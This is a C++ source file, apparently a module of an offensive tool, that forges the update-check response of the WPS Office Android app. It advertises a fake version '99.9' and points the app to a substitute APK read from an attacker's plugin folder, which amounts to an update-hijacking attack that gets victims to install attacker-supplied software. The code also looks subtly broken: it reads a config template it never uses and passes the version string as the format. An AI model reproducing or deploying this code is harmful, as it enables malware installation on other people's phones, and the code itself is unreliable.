#include "WPSMobile.h"
#include "../FileOper.h"
#include "../attacker.h"
#include "../Public.h"
#include "../attack.h"



WPSMobile::WPSMobile() {

}


WPSMobile::WPSMobile(unsigned long ulIP, string filepath, string filename) {
	prepareRespData(ulIP, filepath, filename);
}

int WPSMobile::prepareRespData(unsigned long ulIP, string filepath, string filename) {
	char * lpRespFormat = "HTTP/1.1 200 OK\r\nContent-Type: text/xml; charset=utf-8\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

	int ret = FALSE;
	int cfgfs = 0;
	char * lpcfgformat = 0;

	string path = Public::getUserPluginPath(G_USERNAME);
	string cfgfn =  path + "wps_apk_update.json";
	ret = FileOper::fileReader(cfgfn.c_str(), &lpcfgformat, &cfgfs);
	if (ret <= 0)
	{
		return FALSE;
	}

	int apkfilesize = FileOper::getFileSize(path + ANDROID_REPLACE_FILENAME);

	string version = "99.9";
	char lpJson[MAX_RESPONSE_HEADER_SIZE];
	int iJsonLen = sprintf_s(lpJson, MAX_RESPONSE_HEADER_SIZE,version.c_str(), ANDROID_REPLACE_FILENAME, apkfilesize, version.c_str());

	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iJsonLen, lpJson);

	return m_iRespSize;
}